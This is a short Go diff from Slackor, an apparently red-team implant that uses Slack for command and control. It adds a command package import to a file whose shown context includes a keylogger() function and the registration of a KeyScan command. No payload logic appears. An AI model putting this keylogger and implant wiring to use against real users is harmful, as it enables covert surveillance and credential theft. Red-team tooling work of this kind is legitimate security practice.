@@ -10,6 +10,7 @@ import (
 	"github.com/Coalfire-Research/Slackor/internal/config"
 	"github.com/Coalfire-Research/Slackor/internal/crypto"
 	"github.com/Coalfire-Research/Slackor/internal/slack"
+	"github.com/Coalfire-Research/Slackor/pkg/command"
 )
 
 var (
@@ -482,6 +483,7 @@ func keylogger() {
 		}
 	}
 }
+
 func init() {
 	command.RegisterCommand(KeyScan{})
 }
